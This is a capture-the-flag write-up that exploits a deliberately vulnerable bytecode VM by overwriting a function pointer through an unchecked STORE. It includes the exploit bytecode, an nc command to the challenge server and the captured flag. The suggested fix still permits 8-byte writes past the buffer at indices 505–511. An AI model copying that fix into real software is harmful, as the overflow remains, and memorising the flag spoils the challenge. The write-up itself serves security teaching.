# ByteForge VM - Solution Write-up

## Challenge Overview

This challenge involves exploiting a custom bytecode virtual machine (ByteForge VM) that has several intentional vulnerabilities. The primary vulnerability is a buffer overflow in the STORE instruction.

## Vulnerability Analysis

### STORE Buffer Overflow (Primary Vulnerability)

Looking at `vm.c`, the `OP_STORE` instruction has a critical vulnerability:

```c
case OP_STORE: {
    uint16_t idx = read_u16(vm);
    uint64_t val = pop(vm);
    // VULNERABILITY: Limited bounds check allows overflow
    if (idx >= 512 && idx < 2048) {
        fprintf(stderr, "Warning: Store to extended memory at %u\n", idx);
    }
    *(uint64_t*)(&vm->memory[idx]) = val;  // Writes beyond memory buffer!
    break;
}
```

The bounds check warns but doesn't prevent writes beyond the 512-byte `memory` buffer. This allows writing to adjacent VM struct members.

### Memory Layout

From `vm.h`, the VM struct layout is:
```c
typedef struct VM {
    uint8_t memory[512];           // @ offset 0
    uint64_t stack[128];           // @ offset 512
    size_t sp;                     // @ offset 1536
    uint64_t call_stack[16];       // @ offset 1544
    size_t call_sp;                // @ offset 1672
    uint64_t registers[8];         // @ offset 1680
    size_t pc;                     // @ offset 1744
    uint8_t *bytecode;             // @ offset 1752
    size_t bytecode_size;          // @ offset 1760
    void (*error_handler)(struct VM*);  // @ offset 1768 ← TARGET!
    int exit_code;
    int halted;
} VM;
```

The `error_handler` function pointer is at offset 1768 from the start of the VM struct.

## Exploitation Strategy

### Step 1: Find win() Address

```bash
nm vm | grep win
# Output: 0000000000401316 T win
```

The `win()` function is at address `0x401316` (no PIE, so fixed address).

### Step 2: Calculate Offset

To overwrite `error_handler`:
- `vm->memory` is at offset 0
- `STORE` writes to `&vm->memory[idx]`
- `error_handler` is at offset 1768
- Therefore: `STORE 1768` writes directly to `error_handler`!

### Step 3: Craft Exploit

```asm
PUSH 0x401316      ; Push win() address to stack
STORE 1768         ; Write to error_handler (offset 1768)
TRIGGER_ERROR      ; Call error_handler -> calls win()!
HALT
```

### Step 4: Assemble and Execute

```bash
# Create exploit
cat > exploit.asm << 'EOF'
PUSH 0x401316
STORE 1768
TRIGGER_ERROR
HALT
EOF

# Assemble
./asm.py exploit.asm exploit.bin

# Test locally
./vm exploit.bin

# Attack remote server
nc -q 0 server.ctf.com 9999 < exploit.bin
```

## Output

```
ByteForge VM v1.0
Loaded 14 bytes of bytecode
Starting execution...

Warning: Store to extended memory at 1768

🎉 Congratulations! You've exploited the VM! 🎉

Shellmates{c4ll_st4ck_0v3rfl0w_1s_fun_r1ght?}

VM halted with exit code: 0
```

## Alternative Exploitation Path: Call Stack Overflow

There's also a call stack overflow vulnerability, but it's much harder to exploit:

```c
case OP_CALL: {
    uint16_t addr = read_u16(vm);
    vm->call_stack[vm->call_sp++] = vm->pc;  // No bounds check!
    vm->pc = addr;
    break;
}
```

**Problem:** This only writes **bytecode PC values** (small numbers like 0x50), not native addresses (0x401316).

**Why it's harder:**
- Would need 29 nested CALLs to reach `error_handler`
- Only writes bytecode addresses, not `win()` address
- Would need additional techniques (ROP, shellcode, or JIT spray)
- Not the intended solution path

## Key Concepts

- **Buffer Overflow**: Writing beyond allocated buffer boundaries
- **Function Pointer Hijacking**: Overwriting function pointers to redirect execution
- **Memory Layout Analysis**: Understanding struct member positioning
- **Bytecode Exploitation**: Crafting malicious VM programs
- **Reverse Engineering**: Finding vulnerabilities without source code

## Lessons Learned

1. **Bounds checks must be enforced**, not just warned
2. **Function pointers are critical security targets**
3. **Buffer overflows can affect adjacent struct members**
4. **Custom VMs require careful security design**
5. **Defense in depth**: Use canaries, ASLR, and proper validation

## Security Mitigations

To fix this vulnerability:

```c
case OP_STORE: {
    uint16_t idx = read_u16(vm);
    uint64_t val = pop(vm);
    
    // Proper bounds check with enforcement
    if (idx >= 512) {
        fprintf(stderr, "Memory access out of bounds\n");
        vm->error_handler(vm);
        return;  // Don't execute the write!
    }
    
    *(uint64_t*)(&vm->memory[idx]) = val;
    break;
}
```

## Difficulty Assessment

**Without source code:**
- Reverse engineering: Medium-Hard
- Finding STORE overflow: Medium
- Calculating offsets: Medium
- Exploitation: Easy (once vulnerability found)

**Overall:** Hard-Medium (500 points appropriate)